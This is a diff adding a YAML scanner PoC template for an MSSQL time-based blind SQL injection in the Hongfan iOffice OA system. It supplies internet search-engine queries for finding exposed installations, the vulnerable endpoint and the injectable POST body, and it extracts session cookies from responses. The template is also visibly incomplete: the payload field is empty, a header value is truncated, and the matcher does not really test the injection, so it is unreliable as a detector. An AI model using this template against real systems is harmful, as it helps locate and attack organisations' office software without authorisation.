@@ -1,0 +1,42 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="红帆-ioffice"
+    hunter-query: app.name=="红帆 iOffice"
+    quake-query: app:"ioffice红帆OA协同办公系统"  
+    zoomeye-query: app:"红帆 ioffice"
+    threatbook-query: 
+    cve: 
+    cnvd:
+    tips: mssql 时间盲注
+    payload: 
+    
+name: poc-yaml-hongfan-ioffice-ioEmpFocusSelType.aspx-sqli
+transport: http
+set:
+  s1: randomInt(10000,99999)
+  s2: randomLowercase(8)
+
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /ioffice/prg/set/ioCom/ioEmpFocusSelType.aspx
+      follow_redirects: false
+      headers:
+        X-MicrosoftAjax: Delta=true
+        Content-Type: application/x-www-form-urlencoded; charset=utf-
+      body: "ctl00%24scriptman%24ScriptManager1=ctl00%24cntForm%24upData%7Cctl00%24cntForm%24cmdSeach&ctl00%24cntForm%24txtSeach=*&ctl00%24cntButton%24txtTypeID=&__EVENTTARGET=ctl00%24cntForm%24cmdSeach&__ASYNCPOST=true&"
+    expression: >-
+      response.status == 200 && response.body_string.contains("ctl00_cntForm_upData")
+
+    output:
+      search: |-
+        "ASP.NET_SessionId=(?<token>\\w*)".bsubmatch(response.raw_header)
+      token: search["token"]
+
+expression: r0()  
